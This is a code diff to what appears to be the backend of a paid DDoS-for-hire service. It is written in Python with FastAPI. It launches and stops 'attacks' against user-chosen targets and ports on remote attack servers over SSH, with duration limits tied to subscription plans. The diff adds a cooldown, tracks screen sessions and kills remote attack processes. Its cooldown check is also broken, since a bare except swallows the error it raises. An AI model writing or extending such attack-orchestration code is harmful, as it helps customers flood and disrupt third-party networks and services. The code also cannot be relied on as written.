@@ -760,6 +760,20 @@ async def create_attack(data: AttackRequest, user: dict = Depends(get_current_us
     if settings.get("maintenance_mode"):
         raise HTTPException(status_code=503, detail="System is under maintenance")
     
+    # Check cooldown - user's last attack must be at least 1 second ago
+    last_attack = await db.attacks.find_one(
+        {"user_id": user["id"]},
+        {"_id": 0, "started_at": 1},
+        sort=[("started_at", -1)]
+    )
+    if last_attack:
+        try:
+            last_time = datetime.fromisoformat(last_attack["started_at"].replace('Z', '+00:00'))
+            if (datetime.now(timezone.utc) - last_time).total_seconds() < 1:
+                raise HTTPException(status_code=429, detail="Cooldown: Please wait 1 second between attacks")
+        except:
+            pass
+    
     user_plan = PLANS.get(user["plan"], PLANS["free"])
     
     if data.duration > user_plan["max_time"]:
@@ -785,6 +799,7 @@ async def create_attack(data: AttackRequest, user: dict = Depends(get_current_us
     attack = {
         "id": attack_id,
         "user_id": user["id"],
+        "username": user["username"],
         "target": data.target,
         "port": data.port,
         "method": data.method,
@@ -795,24 +810,34 @@ async def create_attack(data: AttackRequest, user: dict = Depends(get_current_us
         "status": "running",
         "started_at": datetime.now(timezone.utc).isoformat(),
         "ended_at": None,
-        "command": None
+        "command": None,
+        "screen_name": None
     }
     
-    success, command = await execute_attack_on_server(server, attack)
+    success, command, screen_name = await execute_attack_on_server(server, attack, user["username"])
     attack["command"] = command
+    attack["screen_name"] = screen_name
     
     if not success:
-        raise HTTPException(status_code=500, detail="Failed to start attack")
+        raise HTTPException(status_code=500, detail="Failed to start attack on server")
     
     await db.attacks.insert_one(attack)
-    asyncio.create_task(schedule_attack_end(attack_id, server["id"], data.concurrents, data.duration))
+    asyncio.create_task(schedule_attack_end(attack_id, server["id"], data.concurrents, data.duration, screen_name, server))
     
-    return {"id": attack_id, "status": "running", "server": server["name"], "command": command}
+    # 1 second cooldown enforced by sleeping
+    await asyncio.sleep(1)
+    
+    return {"id": attack_id, "status": "running", "server": server["name"], "screen_name": screen_name}
 
-async def schedule_attack_end(attack_id: str, server_id: str, concurrents: int, duration: int):
+async def schedule_attack_end(attack_id: str, server_id: str, concurrents: int, duration: int, screen_name: str, server: dict):
+    """Wait for attack duration then stop it"""
     await asyncio.sleep(duration)
     attack = await db.attacks.find_one({"id": attack_id}, {"_id": 0})
     if attack and attack["status"] == "running":
+        # Stop the attack on server
+        if screen_name and server:
+            await stop_attack_on_server(server, screen_name)
+        
         await db.attacks.update_one(
             {"id": attack_id},
             {"$set": {"status": "completed", "ended_at": datetime.now(timezone.utc).isoformat()}}
@@ -827,11 +852,23 @@ async def stop_attack(attack_id: str, user: dict = Depends(get_current_user)):
     if attack["status"] != "running":
         raise HTTPException(status_code=400, detail="Attack is not running")
     
+    # Get server info
+    server = await db.attack_servers.find_one({"id": attack["server_id"]}, {"_id": 0})
+    
+    # Stop the attack on server via SSH
+    screen_name = attack.get("screen_name")
+    if screen_name and server:
+        await stop_attack_on_server(server, screen_name)
+    
     await db.attacks.update_one(
         {"id": attack_id},
         {"$set": {"status": "stopped", "ended_at": datetime.now(timezone.utc).isoformat()}}
     )
     await release_server_load(attack["server_id"], attack["concurrents"])
+    
+    # 1 second cooldown
+    await asyncio.sleep(1)
+    
     return {"message": "Attack stopped"}
 
 @api_router.get("/attacks")
